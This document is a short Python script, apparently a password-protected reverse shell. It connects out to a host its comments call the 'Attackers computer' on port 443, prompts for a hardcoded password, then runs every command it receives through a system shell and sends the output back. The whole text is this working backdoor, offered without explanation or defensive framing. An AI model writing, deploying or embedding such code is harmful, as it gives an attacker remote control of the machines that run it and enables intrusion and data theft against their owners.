 #! /usr/bin/python
import subprocess #Process commands
import socket #Process socket data

host = "127.0.0.1"	#Attackers computer
port = 443	#Attack port
passwd =  "password" #Password

#Check password
def Login():
	global s 
	s.send("Login: ")
	pwd = s.recv(1024)

	if pwd.strip() != passwd:
		Login()
	else:
		s.send("Connected #> ")
		Shell()

#Execute shell commands
def Shell():
		while True:
			data= s.recv(1024)

			if data.strip() ==":kill":
				break

			proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			output = proc.stdout.read() + proc.stderr.read()
			s.send(output)
			s.send("#>")

#Start Script
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
Login()


